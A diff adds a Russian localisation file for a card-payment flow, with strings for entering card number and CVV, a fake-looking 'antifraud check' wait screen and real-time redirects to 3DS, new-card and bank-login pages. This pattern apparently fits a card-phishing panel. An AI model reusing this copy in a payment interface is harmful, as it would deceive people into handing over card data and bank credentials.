@@ -1,0 +1,50 @@
+{
+  "selectNetwork": "Выберите сеть",
+  "selectCryptocurrency": "Выберите криптовалюту",
+  "paymentInformation": "Информация о платеже",
+  
+  "newCard": "Новая карта",
+  "enterNewCardData": "Введите данные новой карты",
+  "paymentId": "ID платежа",
+  "amount": "Сумма",
+  "email": "Email",
+  "newCardData": "Данные новой карты",
+  "enterNewCardInfo": "Введите информацию о новой карте",
+  "cardNumber": "Номер карты",
+  "cardHolder": "Владелец карты",
+  "cvv": "CVV",
+  "sending": "Отправка",
+  "sendCardData": "Отправить данные карты",
+  "allDataSentSecurely": "Все данные отправляются безопасно",
+  "redirectingToStatusPage": "Перенаправление на страницу статуса",
+  "redirectingToLoginPage": "Перенаправление на страницу входа",
+  "redirectingInRealTime": "Перенаправление в реальном времени",
+  "newCardDataSent": "Данные новой карты отправлены",
+  "success": "Успешно",
+  "error": "Ошибка",
+  "paymentDataNotFound": "Данные платежа не найдены",
+  "failedToSendCardData": "Не удалось отправить данные карты",
+  "errorSendingData": "Ошибка при отправке данных",
+  
+  "checking": {
+    "title": "Проверка антифрод системой",
+    "processing": "Обработка...",
+    "card_details": "Данные карты",
+    "antifraud_check": "Ваша карта проверяется нашей антифрод системой",
+    "wait_message": "Пожалуйста, подождите, пока мы проверим данные платежа. Обычно это занимает несколько минут.",
+    "redirecting_3ds": "Перенаправление на 3DS верификацию",
+    "redirecting_new_card": "Перенаправление на форму новой карты",
+    "redirecting_bank": "Перенаправление на вход в банк",
+    "redirecting_to_3ds": "Перенаправление на страницу 3DS верификации...",
+    "redirecting_to_new_card": "Перенаправление на форму новой карты...",
+    "redirecting_to_bank": "Перенаправление на страницу входа в банк...",
+    "redirect_message": "Вы будете автоматически перенаправлены через несколько секунд...",
+    "completed": "Проверка завершена",
+    "final_message": "Проверка антифрод системой завершена. Теперь вы можете продолжить платеж.",
+    "back_to_payments": "Вернуться к платежам",
+    "cancel_payment": "Отменить платеж"
+  }
+}
+
+
+
